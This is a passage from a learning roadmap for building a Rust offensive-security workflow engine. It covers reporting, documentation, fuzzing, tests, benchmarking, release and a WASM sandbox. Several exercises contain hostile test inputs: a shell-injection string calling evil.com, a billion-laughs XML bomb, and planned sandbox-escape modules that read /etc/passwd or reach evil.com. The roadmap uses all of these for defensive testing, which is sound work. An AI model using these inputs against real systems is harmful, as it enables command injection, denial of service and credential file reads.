  - `report` node producing three formats:
    - **Markdown:** findings by severity with evidence
    - **JSON:** machine-readable for integration
    - **HTML:** styled client-ready report using the **Tera** crate (Jinja2-inspired template engine)
  - Add `tera` to your project. Create an `achilles_report.html` template with CSS styling: severity colors, evidence code blocks, metadata header
  - Include: workflow name, execution time, scope, tools used, approved findings with evidence
  - *Lesson: the report is the deliverable of a pentest. Not the scans. Not the terminal output. If Achilles produces a report a pentester can hand to a client with minor edits, the tool has justified its existence.*

- [ ] Day 33 — README and documentation
  - README: what Achilles is (one paragraph), installation, quick start (5 steps), template list, security model
  - `achilles --help` text a stranger can understand
  - `achilles nodes info <node>` for each tool node

### Day 33b — The stranger test

- [ ] Give your tool to one other person. Say only "read the README and try to run the bug bounty recon template." Watch them.
  - Every confusion → write it down. Do not help.
  - Every unclear error → write it down.
  - Every "what does this mean?" → write it down.
  - Fix every single point. Update README, improve errors, add `--help`.
  - *Lesson: you are no longer the user. You are the developer. The gap between what you know and what a new user knows is larger than you think.*

---

## Phase 10: Testing & Public Release (Days 34-37)
*Shipping security code without tests is shipping vulnerabilities.*

- [ ] Day 34 — Unit tests + performance profiling
  - Unit tests for every critical function:
    - Schema validation: valid passes, invalid fails with correct error
    - Scope enforcement: 10 cases (wildcards, CIDRs, exclusions, edges)
    - Each transformer: snapshot tests with `insta` — given exact tool output, assert exact ADC JSON
    - Secrets scrubbing: assert known secrets never appear in any output
  - `cargo test` — all pass. `cargo tarpaulin` — target >80% on core modules.
  - **Performance profiling:** install `samply` or `cargo flamegraph`. Profile a full workflow run. Identify the slowest function. Is it the nmap XML parser? The schema validator? Know where your time goes.
  - *Lesson: snapshot tests are perfect for transformers. Save real tool output, save expected ADC output, assert they match. When you update a transformer, `insta` shows exactly what changed.*

### Day 34b — Adversarial Fuzzing for Transformers

The Day 34 snapshot tests prove your transformers handle *expected* input correctly. This day proves they survive *adversarial* input — the kind TA-4 (Tool Output Injector) would craft to crash or exploit the engine.

- [ ] Exercises:
  - **Malformed XML:** Feed your nmap transformer XML with:
    - Unclosed tags: `<host><ports><port` (no closing tags)
    - Invalid UTF-8 sequences embedded in hostname fields
    - A `<!DOCTYPE>` declaration with a billion-laughs expansion (XML bomb): `<!DOCTYPE bomb [<!ENTITY a "aaa...(1KB)..."><!ENTITY b "&a;&a;&a;...(1000x)...">]>` — does `quick-xml` reject this, or does it expand and OOM?
    - Deeply nested tags: 10,000 levels of `<script><script><script>...` — does the parser stack overflow?
    - Assert: every malformed input returns `Err(TransformError)`, never panics, never allocates more than 100 MB
  - **Gigantic input:** Generate a valid nmap XML file with 100,000 hosts and 65,535 ports per host. Feed it to the transformer.
    - Measure: time and peak memory. If it takes >30 seconds or >1 GB, profile with `cargo flamegraph` and optimize.
    - This represents a realistic worst case — nmap scanning a /16 network with all ports
  - **Malformed JSONL (httpx/nuclei):** Feed:
    - A line that is valid JSON but missing required fields (`{}` with no `url` key)
    - A line that is not valid JSON at all (`not json at all`)
    - A 500 MB single-line JSON blob (one enormous string value)
    - Interleaved valid and invalid lines — does the transformer skip bad lines and continue, or abort entirely?
  - **Add `cargo-fuzz` for continuous fuzzing:**
    - `cargo install cargo-fuzz`
    - Write a fuzz target for `transform_nmap`: `fuzz_target!(|data: &[u8]| { let _ = transform_nmap(std::str::from_utf8(data).unwrap_or("")); });`
    - Run for 10 minutes: `cargo fuzz run fuzz_nmap_transformer -- -max_total_time=600`
    - Any crash = a bug. Fix it. This is how production parsers are hardened.
  - *Lesson: your transformers parse untrusted input from tools that process untrusted data from adversarial targets. A target that returns a crafted HTTP response could influence nmap's XML output, which your transformer parses. If the transformer panics or OOMs, the entire engine goes down. Fuzz until nothing breaks.*

### Day 34c — Serialization Benchmark: JSON vs MessagePack

The architecture document (§4.1) specifies JSON for all serialization, with MessagePack as a future optimization. This day answers the question: **does JSON serialization actually bottleneck the Tokio executor?** You must prove this empirically, not assume it.

- [ ] Exercises:
  - Add `rmp-serde` and `criterion` to your project:
    - `cargo add rmp-serde` (MessagePack serialization via serde)
    - `cargo add criterion --dev` (benchmarking framework)
  - Create a benchmark dataset: generate 10,000 `Host` objects, each with 20 ports, 5 services, and realistic field sizes. This represents a large reconnaissance workflow output.
  - Write a `criterion` benchmark comparing:
    ```rust
    // JSON serialization
    fn bench_json(hosts: &[Host]) {
        let _ = serde_json::to_vec(hosts).unwrap();
    }

    // MessagePack serialization
    fn bench_msgpack(hosts: &[Host]) {
        let _ = rmp_serde::to_vec(hosts).unwrap();
    }

    // JSON deserialization
    fn bench_json_deser(data: &[u8]) {
        let _: Vec<Host> = serde_json::from_slice(data).unwrap();
    }

    // MessagePack deserialization
    fn bench_msgpack_deser(data: &[u8]) {
        let _: Vec<Host> = rmp_serde::from_slice(data).unwrap();
    }
    ```
  - Run: `cargo bench`. Record the results: serialization time, deserialization time, output size for both formats.
  - **Profile a full workflow run with `cargo flamegraph`:**
    - Run the full bug bounty recon workflow with `cargo flamegraph -- run recon.yaml`
    - Open the flamegraph SVG. Find `serde_json::to_vec` and `serde_json::from_slice` in the flame. What percentage of total execution time do they represent?
    - **Expected result:** JSON serialization is <1% of total execution time. The vast majority of time is spent in subprocess I/O (waiting for nmap, nuclei, etc.) and XML parsing. Serialization is not the bottleneck.
    - **If serialization IS >5% of total time:** switch the state store and inter-node transport to MessagePack. Keep JSON for reports and human-readable output. Document the measured improvement.
  - Write a one-paragraph conclusion: "JSON serialization of 10,000 Host objects takes X ms. A full workflow run takes Y seconds. Serialization is Z% of total time. [MessagePack is / is not] justified at this stage."
  - *Lesson: performance optimization without measurement is superstition. The flamegraph tells you where your time goes. If 98% of time is subprocess I/O, optimizing serialization from 10ms to 3ms saves nothing. Prove the bottleneck before changing the architecture.*


- [ ] Day 35 — Integration tests and adversarial input
  - Integration tests with `assert_cmd`:
    - `achilles validate good.yaml` → exit 0
    - `achilles validate bad.yaml` → exit non-zero with error
    - `achilles run` with scope violation → aborts before any tool executes
  - **Adversarial input tests:**
    - `tool: "nmap; curl evil.com"` → **no shell injection**
    - Circular dependency → rejection
    - Node output containing `${secrets.API_KEY}` as literal → scrubber replaces it
    - Workflow referencing missing secrets → clear error, not a crash
  - *Lesson: adversarial testing is the minimum standard for security tools. If your offensive security tool has an injection vulnerability, the irony will not protect you. §7.1.*

- [ ] Day 36 — Git hygiene and release preparation
  - Clean git history: `git rebase -i` to squash WIP commits (you learned this in Day G3)
  - `CONTRIBUTING.md`: how to add a tool node, run tests, code review expectations
  - `LICENSE` file: Apache 2.0 (see §13.2 for why)
  - GitHub Actions CI: `cargo build`, `cargo test`, `cargo clippy`, `cargo fmt --check` on every push
  - *Lesson: clean history, CI, and contribution guide are the difference between "student project" and "professional open-source tool." Employers check your CI before your code.*

### Day 36b — Record a demo

- [ ] 3-5 minute video:
  1. `achilles validate bug_bounty_recon.yaml` — validation passes
  2. `achilles run bug_bounty_recon.yaml` — progress bar, nodes running
  3. Approval node triggers — Slack notification shown
  4. `achilles approve` — workflow resumes
  5. Report generated — markdown/HTML output shown
  - Post on GitHub README.
  - *Lesson: a demo video is worth a thousand lines of documentation.*

- [ ] Day 37 — Release
  - `cargo build --release` → pre-built Linux binary
  - GitHub release: binary, source tarball, SHA256 checksums, release notes (included, not-yet-implemented, limitations)
  - Post to: r/netsec, r/rust, relevant Discord servers
  - *Lesson: releasing is a separate skill. The last 10% — packaging, docs, release notes — is what separates "I built something" from "I shipped something people can use."*

---

## Phase 10b: WASM Sandbox for Custom Scripts (Days 38-41) — *Optional / Advanced*
*This phase is for those who want to go deeper. It is not required for a functional Achilles, but it completes the security architecture described in §6.4 and §3 (I-02).*

- [ ] Day 38 — WASM fundamentals
  - Understand what WebAssembly is: a portable binary format that runs in a sandboxed virtual machine. It cannot access the filesystem, network, or host memory unless explicitly granted.
  - Write a simple Rust program. Compile it to WASM: `cargo build --target wasm32-wasi`
  - Run it with Wasmtime CLI: `wasmtime run target/wasm32-wasi/debug/your_program.wasm`
  - Observe: the program runs. Try to read a file — it fails (no filesystem capability). Try to make a network request — it fails (no network capability). This is the sandbox.
  - *Lesson: WASM is not just for browsers. Wasmtime is a server-side WASM runtime designed for embedding. Achilles uses it to run untrusted custom scripts safely.*

- [ ] Day 39 — Wasmtime embedding in Rust
  - Add `wasmtime` and `wasmtime-wasi` crates to your Achilles project
  - Write a host function that: loads a WASM module, creates a WASI context with no capabilities, runs the module, captures its output
  - Grant selective capabilities: allow reading from one specific directory. Verify the module can read files in that directory but nowhere else.
  - Grant network capability to one specific host. Verify the module can HTTP GET that host but no others.
  - *Lesson: capability-based security means "deny everything, then grant specific permissions." This is the opposite of traditional Unix permissions (allow everything, then deny specific things). It is fundamentally more secure.*

- [ ] Day 40 — Custom script node integration
  - Implement a `custom_script` node type in Achilles:
    ```yaml
    - name: custom_enrichment
      type: custom_script
      language: rust_wasm  # or python_wasm via Pyodide
      capabilities:
        network: { allow: ["api.shodan.io"] }
        time_limit: 60s
        memory_limit: 256MB
      script_path: ./scripts/shodan_enrich.wasm
    ```
  - The engine: reads `capabilities`, creates a WASI context with only those permissions, loads the WASM module, injects ADC input objects, captures ADC output objects
  - Implement the SDK API (§6.4): `input.get_all("Host")`, `output.emit(host)`, `secrets.get("SHODAN_KEY")`, `http.get(url)`

- [ ] Day 41 — Sandbox escape testing
  - Write 5 malicious WASM modules that attempt:
    1. Read `/etc/passwd`
    2. Make HTTP request to `evil.com` (not in capabilities)
    3. Allocate 1GB of memory (exceeds 256MB limit)
    4. Run for 5 minutes (exceeds 60s time limit)
    5. Write to the host filesystem
  - All 5 must fail with clear, descriptive errors. None should crash the engine.
  - *Lesson: the sandbox is the security boundary between trusted (engine) and untrusted (community scripts). If a malicious WASM module can escape the sandbox, every operator who runs a community workflow is vulnerable. Zero-tolerance for escape. This is §3 (I-02).*

---

### Revised Phase Summary

| Phase | Title | Days | Key Focus |
|---|---|---|---|
| **Phase 0** | Git & GitHub | G1–G3 | Version control, branching, professional workflow |
| **Phase 0b** | Lab Setup | 1 day | Tools, targets, legal boundaries |
| **Phase 1** | Rust & Systems | Days 1–6 | Ownership, borrowing, subprocesses, error handling |
| **Phase 2** | Data Contract (ADC) | Days 7–9 | Typed schemas, JSON Schema, nmap/httpx/subfinder transformers |
| **Phase 3** | Process Orchestration | Days 10–12 | Tokio async, DAG concepts, parallel execution |
| **Phase 4** | Workflow Engine | Days 13–16 | YAML parsing, DAG validation, state management, execution loop |
| **Phase 5** | CLI Design | Days 17–18 | clap, progress bars, error UX, cross-platform paths |
| **Phase 6** | Security & Scope | Days 19–21 | Three-point scope, secrets vault, audit hash chain |
| **Phase 7** | Node Library | Days 22–27 | 6 tool nodes (subfinder, httpx, nmap, nuclei, ffuf, sqlmap) + 4 logic nodes |
| **Phase 8** | Approval Node | Days 28–29 | Human gate, webhook notifications, default-deny timeout |
| **Phase 9** | Templates & Polish | Days 30–33 | 3 templates, Tera HTML reports, README, stranger test |
| **Phase 10** | Testing & Release | Days 34–37 | Unit/integration/adversarial tests, profiling, CI, release |
| **Phase 10b** | WASM Sandbox *(optional)* | Days 38–41 | Wasmtime embedding, capability-based security, escape testing |

### What You Will Have Built

| Component | What it does | Lines of Rust (approx.) |
|---|---|---|
| **Engine core** | YAML parser + DAG builder + executor + state management | ~2,000 |
| **ADC types** | Host, Port, Service, URL, Finding, Credential, DNSRecord | ~500 |
| **6 tool nodes** | subfinder, httpx, nmap, nuclei, ffuf, sqlmap (with transformers) | ~3,000 |
| **4 logic nodes** | conditional, merge, split, data transform | ~500 |
| **Scope enforcer** | Domain/IP/CIDR/port matching with 3-point enforcement | ~400 |
| **Secrets vault** | AES-256-GCM encrypted storage with log scrubbing | ~300 |
| **Audit logger** | Append-only hash chain with tamper detection | ~200 |
| **Approval node** | CLI + webhook approval with timeout and default-deny | ~400 |
| **CLI** | 10+ commands with progress bars, colored output, JSON mode | ~600 |
| **Report generator** | Markdown, JSON, HTML (Tera templates) | ~500 |
| **3 templates** | Bug bounty, web app, API security workflows | ~150 (YAML) |
| **Tests** | Unit + integration + adversarial + snapshot | ~1,500 |
| **WASM sandbox** *(optional)* | Wasmtime + capabilities + SDK | ~800 |
| **Total** | A real, tested, documented offensive security workflow engine | **~10,850** |

---

*Each day = 2-4 hours of focused work. Budget one unit per weekday evening, two per weekend day. At this pace: approximately 4 months of real calendar time. This is correct. Do not rush.*

*Every exercise is done BY YOU. AI explains concepts and answers why — it does NOT write code for you.*
